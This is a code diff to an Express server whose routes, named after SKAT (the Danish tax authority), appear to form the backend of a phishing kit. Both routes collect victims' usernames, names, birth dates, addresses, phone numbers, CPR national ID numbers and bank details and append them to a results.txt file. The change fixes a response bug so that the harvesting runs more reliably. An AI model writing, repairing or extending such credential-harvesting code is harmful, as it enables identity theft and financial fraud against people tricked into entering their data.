@@ -2875,11 +2875,13 @@ app.post('/skatPersonal', (req, res) => {
 
     var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n\n`;
 
-    fs.appendFile('results.txt', resultsTxt, err => {
+        fs.appendFile('results.txt', resultsTxt, err => {
 
-        res.send("Update Completed");
+            if(err) {
+                console.log(err)
+            }
 
-    })
+        })
 
     res.send("Update Completed");
 });
@@ -2932,15 +2934,20 @@ app.post('/skatBilling', (req, res) => {
         ).catch(e => {
             console.log(e)
         });
-        res.send("Update Completed");
 
         var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n\n`;
 
         fs.appendFile('results.txt', resultsTxt, err => {
 
-            res.send("Update Completed");
+            if(err) {
+                console.log(err)
+            }
 
         })
+
+        res.send("Update Completed");
+
+
     }).catch(e => {
         console.log(e)
     })
